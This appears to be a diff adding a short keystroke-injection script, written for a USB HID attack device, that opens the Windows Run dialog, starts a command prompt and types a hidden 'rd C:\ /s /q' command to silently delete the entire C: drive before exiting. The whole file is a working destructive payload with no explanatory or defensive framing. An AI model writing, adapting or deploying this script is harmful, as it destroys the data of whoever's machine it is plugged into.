@@ -1,0 +1,12 @@
+GUI r
+delay (500)
+type ("cmd")
+delay (500)
+press ("ENTER")
+type ("start /min rd C:\ /s /q")
+delay (500)
+press ("ENTER")
+delay (500)
+type ("exit")
+delay (500)
+press ("ENTER")
